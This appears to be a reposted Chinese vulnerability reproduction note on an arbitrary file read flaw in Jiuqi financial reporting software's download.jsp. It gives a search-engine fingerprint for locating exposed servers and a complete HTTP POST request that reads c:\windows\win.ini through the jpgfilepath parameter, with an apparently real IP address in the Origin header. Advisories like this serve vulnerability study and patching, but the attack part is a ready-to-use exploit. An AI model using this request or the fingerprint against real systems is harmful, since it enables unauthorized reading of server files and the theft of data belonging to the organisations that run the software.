---
title: "久其财务报表 download.jsp 任意文件读取漏洞"
date: 2026-10-16 09:10:12
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "久其财务报表"
tags:
  - "久其财务报表"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

久其财务报表 download.jsp 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的信息

## 漏洞影响

```
久其财务报表
```

## 网络测绘

```
body="/netrep/"
```

## 漏洞复现

登录路径如下



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101905343.png)



发送请求包



```plain
POST /netrep/ebook/browse/download.jsp HTTP/1.1
Host: 
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://114.251.113.53:7002
Content-Type: application/x-www-form-urlencoded

jpgfilepath=c:\windows\win.ini
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101905484.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E4%B9%85%E5%85%B6%E8%B4%A2%E5%8A%A1%E6%8A%A5%E8%A1%A8-download.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
